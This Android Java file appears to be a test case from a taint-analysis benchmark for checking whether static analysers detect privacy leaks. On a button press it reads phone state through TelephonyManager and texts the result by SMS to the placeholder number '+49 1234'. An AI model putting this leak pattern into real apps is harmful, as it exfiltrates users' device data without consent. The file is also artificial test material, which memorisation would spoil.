package de.ecspride;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.view.View;
import android.widget.Button;

/**
 * @testcase_name InheritedObjects1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description Based on a condition a variable is initialized. It has a method which either returns a constant string or a tainted value.
 *  The return value is sent by sms.
 * @dataflow VarA.getInfo(): source (gets returned) -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to decide on the subtype of a variable based on a condition.
 */
public class InheritedObjects1 extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_inherited_objects1);


		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				int a = 45 + 1;
				TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				General g;
				if(a == 46){
					g = new VarA();
					g.man = telephonyManager;
				} else{
					g = new VarB();
					g.man = telephonyManager;
				}
				SmsManager sms = SmsManager.getDefault();
				sms.sendTextMessage("+49 1234", null, g.getInfo(), null, null);  //sink, leak
			}
		});
        

    }
}
